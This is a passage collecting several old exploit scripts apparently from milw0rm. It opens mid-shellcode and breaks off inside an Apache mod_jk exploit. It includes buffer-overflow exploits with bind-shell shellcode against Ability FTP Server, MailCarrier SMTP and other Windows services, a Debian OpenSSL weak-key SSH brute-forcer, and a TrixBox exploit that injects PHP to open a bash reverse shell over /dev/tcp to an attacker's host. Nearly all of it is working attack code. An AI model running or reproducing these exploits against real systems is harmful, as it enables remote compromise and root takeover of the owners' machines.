"\x36\x51\x4f\x4d\x59\x4d\x35\x45\x36\x4b\x31\x4a\x4d\x45\x58"
"\x43\x32\x50\x55\x42\x4a\x44\x42\x4b\x4f\x48\x50\x43\x58\x49"
"\x49\x45\x59\x4c\x35\x4e\x4d\x50\x57\x4b\x4f\x48\x56\x46\x33"
"\x46\x33\x50\x53\x50\x53\x46\x33\x47\x33\x46\x33\x51\x53\x46"
"\x33\x4b\x4f\x4e\x30\x45\x36\x42\x48\x42\x31\x51\x4c\x45\x36"
"\x50\x53\x4b\x39\x4d\x31\x4c\x55\x42\x48\x49\x34\x44\x5a\x44"
"\x30\x49\x57\x50\x57\x4b\x4f\x49\x46\x42\x4a\x42\x30\x46\x31"
"\x51\x45\x4b\x4f\x48\x50\x43\x58\x4e\x44\x4e\x4d\x46\x4e\x4b"
"\x59\x51\x47\x4b\x4f\x48\x56\x46\x33\x50\x55\x4b\x4f\x48\x50"
"\x42\x48\x4a\x45\x47\x39\x4b\x36\x47\x39\x51\x47\x4b\x4f\x4e"
"\x36\x46\x30\x46\x34\x46\x34\x50\x55\x4b\x4f\x4e\x30\x4a\x33"
"\x43\x58\x4a\x47\x44\x39\x49\x56\x44\x39\x46\x37\x4b\x4f\x49"
"\x46\x46\x35\x4b\x4f\x48\x50\x42\x46\x43\x5a\x42\x44\x45\x36"
"\x42\x48\x45\x33\x42\x4d\x4c\x49\x4d\x35\x42\x4a\x50\x50\x46"
"\x39\x47\x59\x48\x4c\x4d\x59\x4a\x47\x43\x5a\x51\x54\x4d\x59"
"\x4a\x42\x46\x51\x49\x50\x4c\x33\x4e\x4a\x4b\x4e\x51\x52\x46"
"\x4d\x4b\x4e\x50\x42\x46\x4c\x4d\x43\x4c\x4d\x42\x5a\x46\x58"
"\x4e\x4b\x4e\x4b\x4e\x4b\x42\x48\x43\x42\x4b\x4e\x4e\x53\x42"
"\x36\x4b\x4f\x43\x45\x51\x54\x4b\x4f\x48\x56\x51\x4b\x50\x57"
"\x46\x32\x46\x31\x50\x51\x50\x51\x43\x5a\x43\x31\x46\x31\x50"
"\x51\x51\x45\x50\x51\x4b\x4f\x4e\x30\x42\x48\x4e\x4d\x49\x49"
"\x43\x35\x48\x4e\x50\x53\x4b\x4f\x49\x46\x43\x5a\x4b\x4f\x4b"
"\x4f\x47\x47\x4b\x4f\x4e\x30\x4c\x4b\x51\x47\x4b\x4c\x4b\x33"
"\x48\x44\x45\x34\x4b\x4f\x49\x46\x46\x32\x4b\x4f\x4e\x30\x45"
"\x38\x4a\x50\x4c\x4a\x44\x44\x51\x4f\x51\x43\x4b\x4f\x48\x56"
"\x4b\x4f\x48\x50\x44\x4a\x41\x41"
)

# 77F8AEDC  POP POP RET User32.dll Win 2000 Sp4
evilbuf = '\x90'*252 + shellcode + '\xeb\x06\x90\x90' + \
          '\xDC\xAE\xF8\x77' + '\x90'*8 + '\xE9\x82\xFC\xFF\xFF' + \
          'C'*1225
print '[+] Connecting to host...'
s = socket(AF_INET, SOCK_STREAM)
# s.connect(('192.168.1.195', 6080))
s.connect((HOST, PORT))
print '[+] Overflowing the buffer...'
s.send('GET ' + evilbuf + "\n\n")
s.close()
print '[+] Done! Check your shell on %s:%d' % (HOST, PORT)

# milw0rm.com [2008-04-15]
#!/bin/python
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.
############################################################################
# Autor: hitz - WarCat team (warcat.no-ip.org)
# Collaborator: pretoriano
#
# 1. Download https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)
#
# 2. Extract it to a directory
#
# 3. Execute the python script
#     - something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5
#     - execute: python exploit.py (without parameters) to display the help
#     - if the key is found, the script shows something like that:
#         Key Found in file: ba7a6b3be3dac7dcd359w20b4afd5143-1121
#		  Execute: ssh -lroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240
############################################################################


import Queue
import os
import string
import time
from threading import Thread
import sys

#This class only has a boolean, which will be True if some thread find the key
class End():
	def __init__(self):
		self.end = False
		
	def Finish(self):
		self.end = True
	
	def GetEnd(self):
		return self.end	
		

#This is the thread class
class Connection(Thread):
	def __init__(self,QueueDir,TheEnd,dir,host,user,port='22'):
		Thread.__init__(self)
		self.QueueDir = QueueDir
		self.TheEnd = TheEnd
		self.dir = dir
		self.host = host
		self.user = user
		self.port = port
			
	def run(self):
		while (not self.TheEnd.GetEnd()) and (not self.QueueDir.empty()):
			key = self.QueueDir.get()
			
			cmd = 'ssh -l ' + self.user 
			cmd = cmd + ' -p ' + self.port 
			cmd = cmd + ' -o PasswordAuthentication=no'
			cmd = cmd + ' -i ' + self.dir + '/' + key 
			cmd = cmd + ' ' + self.host + ' exit; echo $?'
			
			pin,pout,perr = os.popen3(cmd, 'r')
			pin.close()
			
			#To debug descoment the next line. This will show the errors reported by ssh
			#print perr.read()
			
			if pout.read().lstrip().rstrip() == '0':
				self.TheEnd.Finish()
				print ''
				print 'Key Found in file: '+ key
				print 'Execute: ssh -l%s -p%s -i %s/%s %s' %(self.user,self.port,self.dir,key,self.host) 
				print ''
		
print '\n-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org' 

if len(sys.argv) < 4:
	print './exploit.py <dir> <host> <user> [[port] [threads]]'
	print '    <dir>: Path to SSH privatekeys (ex. /home/john/keys) without final slash'
	print '    <host>: The victim host'
	print '    <user>: The user of the victim host'	
	print '    [port]: The SSH port of the victim host (default 22)'
	print '    [threads]: Number of threads (default 4) Too big numer is bad'
	
	sys.exit(1)
	
dir = sys.argv[1]
host = sys.argv[2]
user = sys.argv[3]

if len(sys.argv) <= 4: 
	  port='22'
	  threads=4
else:
	if len(sys.argv) <=5:
		port=sys.argv[4]
		threads = 4

	else:
		port=sys.argv[4]	
		threads = sys.argv[5]

ListDir = os.listdir(dir)
QueueDir=Queue.Queue()
TheEnd = End()

for i in range(len(ListDir)):
	if ListDir[i].find('.pub') == -1:	
		QueueDir.put(ListDir[i])

initsize = QueueDir.qsize()
tested = 0

for i in range(0,int(threads)):
	Connection(QueueDir,TheEnd,dir,host,user,port).start()


while (not TheEnd.GetEnd()) and (not QueueDir.empty()):
	time.sleep(5)
	actsize = QueueDir.qsize()
	speed = (initsize - tested - actsize)/5
	tested = initsize - actsize
	
	print 'Tested %i keys | Remaining %i keys | Aprox. Speed %i/sec' %(tested,actsize,speed) 

# milw0rm.com [2008-06-01]
###################################
# Ability Server 2.34 FTP STOR Buffer Overflow   #
# Advanced, secure and easy to use FTP Server. #
# 21 Oct 2004 - muts                                      #
###################################
# D:\BO>ability-2.34-ftp-stor.py                       #
###################################
# D:\data\tools>nc -v 127.0.0.1 4444               #
# localhost [127.0.0.1] 4444 (?) open               #
# Microsoft Windows XP [Version 5.1.2600]        #
# (C) Copyright 1985-2001 Microsoft Corp.        #
# D:\Program Files\abilitywebserver>                #
###################################

import ftplib
from ftplib import FTP
import struct
print "\n\n################################"
print "\nAbility Server 2.34 FTP STOR buffer Overflow"
print "\nFound & coded by muts [at] whitehat.co.il"
print "\nFor Educational Purposes Only!\n" 
print "###################################"

# Shellcode taken from Sergio Alvarez's "Win32 Stack Buffer Overflow Tutorial"

sc = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"
sc += "\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"
sc += "\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa"
sc += "\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f"
sc += "\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb"
sc += "\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"
sc += "\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"
sc += "\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"
sc += "\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"
sc += "\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"
sc += "\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"
sc += "\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"
sc += "\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"
sc += "\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"
sc += "\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"
sc += "\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"
sc += "\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"
sc += "\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"
sc += "\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"
sc += "\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"
sc += "\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"
sc += "\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"
sc += "\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"
sc += "\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"
sc += "\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"

# Change RET address if need be.

#buffer = '\x41'*966+struct.pack('<L', 0x7C2FA0F7)+'\x42'*32+sc # RET Windows 2000 Server SP4
buffer = '\x41'*970+struct.pack('<L', 0x7D17D737)+'\x42'*32+sc # RET Windows XP SP2

try:
# Edit the IP, Username and Password.
ftp = FTP('127.0.0.1') 
ftp.login('ftp','ftp')
print "\nEvil Buffer sent..."
print "\nSploit will hang now because I couldn\'t figure how to use storelines()."
print "\nTry connecting with netcat to port 4444 on the remote machine."
except:
print "\nCould not Connect to FTP Server."
try:
ftp.transfercmd("STOR " + buffer) 
except:
print "\nDone."

# milw0rm.com [2004-10-21]
##################################################
##                                              ##
##              Ability Ftp Server 2.34         ##
##        Remote exploit in APPE command        ##
##        discovered,exploited by KaGra         ##
## Use it with netcat: exploit.py|nc (host) 21  ##
##     BindShell at port 4444,one shot OnLy!    ##
##################################################


import struct
shell = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"
shell += "\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"
shell += "\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa"
shell += "\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f"
shell += "\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb"
shell += "\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"
shell += "\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"
shell += "\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"
shell += "\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"
shell += "\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"
shell += "\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"
shell += "\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"
shell += "\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"
shell += "\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"
shell += "\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"
shell += "\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"
shell += "\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"
shell += "\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"
shell += "\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"
shell += "\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"
shell += "\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"
shell += "\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"
shell += "\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"
shell += "\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"
shell += "\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"

 

buffer = '\x41'*968+struct.pack('<L', 0x77da76af)+'\x42'*32+shell # JMP ESP=>0x77da76af Windows XP SP1 EngLisH 


print "USER kagra"#      Enter a valid username HeRe!
print "PASS kagra"#  Enter a valid password HeRe!
print "APPE " + buffer

# milw0rm.com [2004-10-23]
#########################################################
# MailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow 	#
# Advanced, secure and easy to use FTP Server. 	    	#
# 23 Oct 2004 - muts                                	#
#########################################################
# D:\BO>mailcarrier-2.5-EHLO.py                       	#
#########################################################
# D:\data\tools>nc -v 192.168.1.32 101			#
# localhost [127.0.0.1] 101 (hostname) open		#
# Microsoft Windows 2000 [Version 5.00.2195]		#
# (C) Copyright 1985-2000 Microsoft Corp.		#
# C:\WINNT\system32>					#
#########################################################

import struct
import socket

print "\n\n###############################################"
print "\nMailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow"
print "\nFound & coded by muts [at] whitehat.co.il"
print "\nFor Educational Purposes Only!\n" 
print "\n\n###############################################"

def make_overflow_dummy(overflow_len, retaddr):
    return 'A' * overflow_len + struct.pack('<L', retaddr)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sc2 = "\xEB"
sc2 += "\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
sc2 += "\xFF\x60\xDE\x88\x88\x88\xDB\xDD\xDE\xDF\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D"
sc2 += "\xF0\x89\x62\x03\xC2\x90\x03\xD2\xA8\x89\x63\x6B\xBA\xC1\x03\xBC\x03\x89\x66\xB9"
sc2 += "\x77\x74\xB9\x48\x24\xB0\x68\xFC\x8F\x49\x47\x85\x89\x4F\x63\x7A\xB3\xF4\xAC\x9C"
sc2 += "\xFD\x69\x03\xD2\xAC\x89\x63\xEE\x03\x84\xC3\x03\xD2\x94\x89\x63\x03\x8C\x03\x89"
sc2 += "\x60\x63\x8A\xB9\x48\xD7\xD6\xD5\xD3\x4A\x80\x88\xD6\xE2\xB8\xD1\xEC\x03\x91\x03"
sc2 += "\xD3\x84\x03\xD3\x94\x03\x93\x03\xD3\x80\xDB\xE0\x06\xC6\x86\x64\x77\x5E\x01\x4F"
sc2 += "\x09\x64\x88\x89\x88\x88\xDF\xDE\xDB\x01\x6D\x60\xAF\x88\x88\x88\x18\x89\x88\x88"
sc2 += "\x3E\x91\x90\x6F\x2C\x91\xF8\x61\x6D\xC1\x0E\xC1\x2C\x92\xF8\x4F\x2C\x25\xA6\x61"
sc2 += "\x51\x81\x7D\x25\x43\x65\x74\xB3\xDF\xDB\xBA\xD7\xBB\xBA\x88\xD3\x05\xC3\xA8\xD9"
sc2 += "\x77\x5F\x01\x57\x01\x4B\x05\xFD\x9C\xE2\x8F\xD1\xD9\xDB\x77\xBC\x07\x77\xDD\x8C"
sc2 += "\xD1\x01\x8C\x06\x6A\x7A\xA3\xAF\xDC\x77\xBF\x77\xDD\xB8\xB9\x48\xD8\xD8\xD8\xD8"
sc2 += "\xC8\xD8\xC8\xD8\x77\xDD\xA4\x01\x4F\xB9\x53\xDB\xDB\xE0\x8A\x88\x88\xED\x01\x68"
sc2 += "\xE2\x98\xD8\xDF\x77\xDD\xAC\xDB\xDF\x77\xDD\xA0\xDB\xDC\xDF\x77\xDD\xA8\x01\x4F"
sc2 += "\xE0\xCB\xC5\xCC\x88\x01\x6B\x0F\x72\xB9\x48\x05\xF4\xAC\x24\xE2\x9D\xD1\x7B\x23"
sc2 += "\x0F\x72\x09\x64\xDC\x88\x88\x88\x4E\xCC\xAC\x98\xCC\xEE\x4F\xCC\xAC\xB4\x89\x89"
sc2 += "\x01\xF4\xAC\xC0\x01\xF4\xAC\xC4\x01\xF4\xAC\xD8\x05\xCC\xAC\x98\xDC\xD8\xD9\xD9"
sc2 += "\xD9\xC9\xD9\xC1\xD9\xD9\xDB\xD9\x77\xFD\x88\xE0\xFA\x76\x3B\x9E\x77\xDD\x8C\x77"
sc2 += "\x58\x01\x6E\x77\xFD\x88\xE0\x25\x51\x8D\x46\x77\xDD\x8C\x01\x4B\xE0\x77\x77\x77"
sc2 += "\x77\x77\xBE\x77\x5B\x77\xFD\x88\xE0\xF6\x50\x6A\xFB\x77\xDD\x8C\xB9\x53\xDB\x77"
sc2 += "\x58\x68\x61\x63\x6B\x90"

# Change RET address as need be.

#buffer = make_overflow_dummy(5093, 0x7c2ee21b) + '\x90' * 32 + sc2  # RET Win2000 SP4 ENG
buffer = make_overflow_dummy(5097, 0x7d17dd13) + '\x90' * 32 + sc2  #RET WinXP SP2 ENG

try:
	print "\nSending evil buffer..."
	s.connect(('127.0.0.1',25))
	s.send('EHLO ' + buffer + '\r\n')
	data = s.recv(1024)
	s.close()
	print "\nDone! Try connecting to port 101 on victim machine."
except:
	print "Could not connect to SMTP!"

# milw0rm.com [2004-10-26]
#!/usr/bin/python
# TrixBox 2.6.1 langChoice remote root exploit
# muts from offensive-security.com
# All credits to Jean-Michel BESNARD <jmbesnard@gmail.com>
# Same same, but different.
# http://www.offensive-security.com/0day/trixbox.py.txt
##################################################################################################
# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
# uname -a
# Linux trixbox1.localdomain 2.6.25.7 #4 SMP Tue Jun 17 19:35:11 EDT 2008 i686 i686 i386 GNU/Linux
##################################################################################################

import sys
from socket import *
import re
import os
from time import sleep

print ("[*] BY THE POWER OF GRAYSKULL - I HAVE THE ROOTZ0R!\r\n"
"[*] TrixBox 2.6.1 langChoice remote root exploit \r\n"
"[*] http://www.offensive-security.com/0day/trixbox.py.txt\r\n")

if (len(sys.argv)!=5):
	print "[*] Usage: %s <rhost> <rport> <lhost> <lport>" % sys.argv[0]
	exit(0)

host=sys.argv[1]
port=int(sys.argv[2])
lhost=sys.argv[3]
lport=int(sys.argv[4])


def create_post(injection):
        buffer=("POST /user/index.php HTTP/1.1 \r\n"
        "Host: 192.168.219.132 \r\n"
        "Content-Type: application/x-www-form-urlencoded \r\n"
        "Content-Length: "+str(len(injection))+"\r\n\r\n" +injection)
        return buffer

def send_post(host,port,input):
	s = socket(AF_INET, SOCK_STREAM)
	s.connect((host, port))
	s.send(input)
	output=s.recv(1024)
	s.close()
	return output

def find_sessionid(http_output):
	headers=re.split("\n",http_output)
	for header in headers:
	        if re.search("Set-Cookie",header):
           	    	cook=header.split(" ")
			sessionid=cook[1][10:42]
	                print "[*] Session ID is %s" % sessionid
			return sessionid


print "[*] Injecting reverse shell into session file"
bash_inject="langChoice=<?php shell_exec(\"sudo /bin/bash 0</dev/tcp/"+lhost+"/"+str(lport)+" 1>%260 2>%260\");?>" 
reverse=create_post(bash_inject)
raw_session=send_post(host,port,reverse)

print "[*] Extracting Session ID"
id=find_sessionid(raw_session)

print "[*] Triggering Reverse Shell to %s %d in 3 seconds" % (lhost,lport)
sleep(3)
print "[*] Skadush! \r\n[*] Ctrl+C to exit reverse shell."
tmpsession=create_post('langChoice=../../../../../../../../../../tmp/sess_'+id+'%00')
send_post(host,port,tmpsession)

print "[*] Cleaning up"
cleanup=create_post('langChoice=english')
send_post(host,port,cleanup)
send_post(host,port,cleanup)
print "[*] Done!"

# milw0rm.com [2008-07-12]
#!/usr/bin/python
#
#   _____ _   _ _____  _____ _____ _____
#  /  ___| |_| |  _  \|  _  |  _  |_   _|
#  | (___|  _  | [_)_/| (_) | (_) | | |
#  \_____|_| |_|_| |_||_____|_____| |_|
#         C. H. R. O. O. T.  SECURITY  GROUP
#         - -- ----- --- -- -- ---- --- -- -
#                      http://www.chroot.org
#
#                          _   _ _ _____ ____ ____ __  _ 
#        Hacks In Taiwan  | |_| | |_   _|  __|    |  \| |
#        Conference 2008  |  _  | | | | | (__| () |     |
#                         |_| |_|_| |_| \____|____|_|\__|
#                                      http://www.hitcon.org
#
#
#  Title =======:: Apache (mod_jk) 1.2.19 Remote Stack Overflow Exploit
#
#  Author ======:: unohope [at] chroot [dot] org
#
#  IRC =========:: irc.chroot.org #chroot
#
#  ScriptName ==:: Apache Module mod_jk/1.2.19
#
#  Vendor ======:: http://tomcat.apache.org/
#
#  Download ====:: http://archive.apache.org/dist/tomcat/tomcat-connectors/jk/binaries/win32/
#
#  Tested on ===:: Apache/2.0.58 (Win32) mod_jk/1.2.19
#                  Apache/2.0.59 (Win32) mod_jk/1.2.19
#
#  Greets ======:: zha0
#
#
#  [root@wargame tmp]# ./apx-jk_mod-1.2.19
#  Apache (mod_jk) 1.2.19 Remote Stack Overflow Exploit (unohope@chroot.org)
#
#  usage: ./apx-jk_mod-1.2.19 <host>
#
#  [root@wargame tmp]# ./apx-jk_mod-1.2.19 192.168.1.78
#  Apache (mod_jk) 1.2.19 Remote Stack Overflow Exploit (unohope@chroot.org)
#
#    [+] connecting to 192.168.1.78 ...
#
#  Trying 192.168.1.78...
#  Connected to 192.168.1.78.
#  Escape character is '^]'.
#  Microsoft Windows XP [.. 5.1.2600]
#  (C) Copyright 1985-2001 Microsoft Corp.
#
#  C:\AppServ\Apache2>
#
#

import os, sys, time
from socket import *

shellcode  = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x51\x5a\x6a\x68"
shellcode += "\x58\x30\x41\x31\x50\x42\x41\x6b\x42\x41\x78\x42\x32\x42\x41\x32"
shellcode += "\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x4b\x59\x49\x6c\x43"
shellcode += "\x5a\x7a\x4b\x32\x6d\x5a\x48\x5a\x59\x69\x6f\x4b\x4f\x39\x6f\x71"
shellcode += "\x70\x6e\x6b\x62\x4c\x44\x64\x71\x34\x4c\x4b\x62\x65\x75\x6c\x4c"
shellcode += "\x4b\x63\x4c\x76\x65\x70\x78\x35\x51\x48\x6f\x6c\x4b\x50\x4f\x74"
shellcode += "\x58\x6e\x6b\x33\x6f\x55\x70\x37\x71\x48\x6b\x57\x39\x6c\x4b\x66"
shellcode += "\x54\x6e\x6b\x46\x61\x7a\x4e\x47\x41\x6b\x70\x7a\x39\x4c\x6c\x4c"
shellcode += "\x44\x6f\x30\x62\x54\x44\x47\x38\x41\x4b\x7a\x54\x4d\x44\x41\x4b"
shellcode += "\x72\x78\x6b\x39\x64\x35\x6b\x53\x64\x75\x74\x46\x48\x72\x55\x79"
shellcode += "\x75\x6c\x4b\x53\x6f\x76\x44\x44\x41\x48\x6b\x35\x36\x4e\x6b\x54"
shellcode += "\x4c\x30\x4b\x6c\x4b\x51\x4f\x65\x4c\x65\x51\x38\x6b\x77\x73\x36"
shellcode += "\x4c\x4e\x6b\x6e\x69\x30\x6c\x66\x44\x45\x4c\x30\x61\x69\x53\x30"
shellcode += "\x31\x79\x4b\x43\x54\x6c\x4b\x63\x73\x44\x70\x4e\x6b\x77\x30\x66"
shellcode += "\x6c\x6c\x4b\x72\x50\x45\x4c\x4c\x6d\x4e\x6b\x73\x70\x64\x48\x73"
shellcode += "\x6e\x55\x38\x6e\x6e\x32\x6e\x34\x4e\x58\x6c\x62\x70\x39\x6f\x6b"
shellcode += "\x66\x70\x66\x61\x43\x52\x46\x71\x78\x30\x33\x55\x62\x63\x58\x63"
shellcode += "\x47\x34\x33\x65\x62\x41\x4f\x30\x54\x39\x6f\x4a\x70\x52\x48\x5a"
shellcode += "\x6b\x38\x6d\x6b\x4c\x75\x6b\x30\x50\x6b\x4f\x6e\x36\x53\x6f\x6f"
shellcode += "\x79\x4a\x45\x32\x46\x6f\x71\x6a\x4d\x34\x48\x77\x72\x73\x65\x73"
shellcode += "\x5a\x37\x72\x69\x6f\x58\x50\x52\x48\x4e\x39\x76\x69\x4a\x55\x4c"
shellcode += "\x6d\x32\x77\x69\x6f\x59\x46\x50\x53\x43\x63\x41\x43\x70\x53\x70"
shellcode += "\x53\x43\x73\x50\x53\x62\x63\x70\x53\x79\x6f\x6a\x70\x35\x36\x61"
shellcode += "\x78\x71\x32\x78\x38\x71\x76\x30\x53\x4b\x39\x69\x71\x4d\x45\x33"
shellcode += "\x58\x6c\x64\x47\x6a\x74\x30\x5a\x67\x43\x67\x79\x6f\x39\x46\x32"
shellcode += "\x4a\x56\x70\x66\x31\x76\x35\x59\x6f\x58\x50\x32\x48\x4d\x74\x4e"
shellcode += "\x4d\x66\x4e\x7a\x49\x50\x57\x6b\x4f\x6e\x36\x46\x33\x56\x35\x39"
shellcode += "\x6f\x78\x50\x33\x58\x6b\x55\x51\x59\x4e\x66\x50\x49\x51\x47\x39"
shellcode += "\x6f\x48\x56\x32\x70\x32\x74\x62\x74\x46\x35\x4b\x4f\x38\x50\x6e"
shellcode += "\x73\x55\x38\x4d\x37\x71\x69\x69\x56\x71\x69\x61\x47\x6b\x4f\x6e"
shellcode += "\x36\x36\x35\x79\x6f\x6a\x70\x55\x36\x31\x7a\x71\x74\x32\x46\x51"
shellcode += "\x78\x52\x43\x70\x6d\x4f\x79\x4d\x35\x72\x4a\x66\x30\x42\x79\x64"
shellcode += "\x69\x7a\x6c\x4b\x39\x48\x67\x62\x4a\x57\x34\x4f\x79\x6d\x32\x37"
shellcode += "\x41\x6b\x70\x7a\x53\x6e\x4a\x69\x6e\x32\x62\x46\x4d\x6b\x4e\x70"
shellcode += "\x42\x44\x6c\x4c\x53\x6e\x6d\x31\x6a\x64\x78\x4c\x6b\x4e\x4b\x4e"
shellcode += "\x4b\x43\x58\x70\x72\x69\x6e\x6d\x63\x37\x66\x79\x6f\x63\x45\x73"
shellcode += "\x74\x4b\x4f\x7a\x76\x63\x6b\x31\x47\x72\x72\x41\x41\x50\x51\x61"
shellcode += "\x41\x70\x6a\x63\x31\x41\x41\x46\x31\x71\x45\x51\x41\x4b\x4f\x78"
shellcode += "\x50\x52\x48\x4c\x6d\x79\x49\x54\x45\x38\x4e\x53\x63\x6b\x4f\x6e"
shellcode += "\x36\x30\x6a\x49\x6f\x6b\x4f\x70\x37\x4b\x4f\x4e\x30\x4e\x6b\x30"
shellcode += "\x57\x69\x6c\x6b\x33\x4b\x74\x62\x44\x79\x6f\x6b\x66\x66\x32\x6b"
shellcode += "\x4f\x4e\x30\x53\x58\x58\x70\x4e\x6a\x55\x54\x41\x4f\x52\x73\x4b"
shellcode += "\x4f\x69\x46\x4b\x4f\x6e\x30\x68";

foo_base = 8
buf_base = 4087
buf_offset = foo_base * 11
nop = "\x90"
ret = "\xcc\x2a\xd9\x77"
buf = nop*foo_base + shellcode + nop*(buf_base - foo_base - len(shellcode) - buf_offset) + ret
buf += "\x90\x90\xb0\x53\x6b\xC0\x28\x03\xd8\xff\xd3" + nop*(buf_offset - foo_base - 3)

def usage():
  print 'usage: %s <host>\n' % sys.argv[0]
